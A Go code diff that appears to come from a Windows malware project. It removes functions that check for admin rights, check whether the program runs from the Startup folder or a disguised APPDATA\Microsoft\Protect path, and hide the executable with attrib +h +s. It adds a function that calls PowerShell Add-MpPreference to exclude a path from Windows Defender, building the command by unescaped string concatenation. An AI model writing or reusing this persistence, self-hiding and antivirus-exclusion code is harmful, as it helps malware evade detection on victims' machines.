@@ -1,40 +1,22 @@
 package program
 
 import (
-	"os"
+	"fmt"
 	"os/exec"
-	"path/filepath"
-	"syscall"
+	
 )
 
-func IsElevated() bool {
-	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
-	return ret != 0
-}
+func AddtoPath(filePath string) {
+	fmt.Println("Path to add to the exclusion list:", filePath)
 
-func IsInStartupPath() bool {
-	exePath, err := os.Executable()
+	cmd := exec.Command("powershell", "-Command", "Add-MpPreference -ExclusionPath '"+filePath+"'")
+	err := cmd.Run()
+
 	if err != nil {
-		return false
-	}
-	exePath = filepath.Dir(exePath)
-
-	if exePath == "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" {
-		return true
-	}
-
-	if exePath == filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Protect") {
-		return true
-	}
-
-	return false
-}
-
-func HideSelf() {
-	exe, err := os.Executable()
-	if err != nil {
+		fmt.Println("Failed to add to exclusion list:", err)
 		return
 	}
-
-	exec.Command("attrib", "+h", "+s", exe).Start()
+	fmt.Println("Successfully added to exclusion list")
 }
+
+
